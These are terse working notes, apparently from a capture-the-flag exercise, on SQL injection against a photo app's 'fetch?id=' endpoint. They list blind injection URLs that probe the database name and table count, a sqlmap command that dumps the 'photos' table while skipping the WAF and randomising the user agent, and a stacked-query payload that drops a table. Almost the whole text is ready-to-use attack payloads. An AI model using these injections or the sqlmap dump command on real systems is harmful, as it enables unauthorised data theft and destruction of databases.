
## WIP

DB Layout:
...db_name: "level5" 
...num_of_tables : 2
...tables_names : albums, photos

http://35.227.24.107/9b5e1576f4/fetch?id=4%20or%20database()%20LIKE%20%22level5%22

35.227.24.107/9b5e1576f4/fetch?id=1 AND (SELECT Count(*) FROM information_schema.tables WHERE table_schema=database())=2

To dump it all :
sqlmap -u "http://35.237.57.141:5001/b09a24aa14/fetch?id=2" --method GET --dump -D level5 -T photos -p id --code 200 --skip-waf --random-agent --threads 10 -o

Flag 2 – Stacked Queries
Drop a table: (breaks app)
http://35.196.135.216/5ddb86c66f/fetch?id=1;%20DROP%20Table%20photos



